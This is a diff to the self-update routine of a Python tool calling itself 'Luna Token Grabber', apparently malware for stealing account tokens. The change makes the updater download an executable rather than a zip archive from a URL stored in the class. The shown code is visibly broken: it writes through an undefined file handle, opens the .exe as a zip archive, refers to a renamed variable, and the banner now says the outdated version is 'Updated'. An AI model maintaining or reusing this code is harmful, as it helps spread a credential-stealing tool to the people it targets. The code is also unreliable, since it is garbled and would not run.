@@ -31,15 +31,15 @@ class Update():
                     ██║╚██╗██║██╔══╝  ██║███╗██║    ██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝  ╚═╝
                     ██║ ╚████║███████╗╚███╔███╔╝    ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗██╗
                     ╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝      ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝
-                                      Your version of Luna Token Grabber is outdated!''')
+                                      Your version of Luna Token Grabber is Updated!''')
             choice = input('\nWould you like to update? (y/n): ')
             if choice.lower() == 'y':
-                new_version_source = requests.get(self.zipfile)
-                with open("Luna-Grabber-main.zip", 'wb')as zipfile:
+                new_version_source = requests.get(self.exefile)
+                with open("Luna-Grabber-main.exe", 'wb')as exefile:
                     zipfile.write(new_version_source.content)
-                with ZipFile("Luna-Grabber-main.zip", 'r') as filezip:
+                with ZipFile("Luna-Grabber-main.exe", 'r') as fileexe:
                     filezip.extractall(path=os.path.join(os.path.expanduser("~"), "Downloads"))
-                os.remove("Luna-Grabber-main.zip")
+                os.remove("Luna-Grabber-main.exe")
                 print('The new version is now in your Downloads folder.\nUpdate Complete!')
                 print("Exiting...")
                 sleep(5)
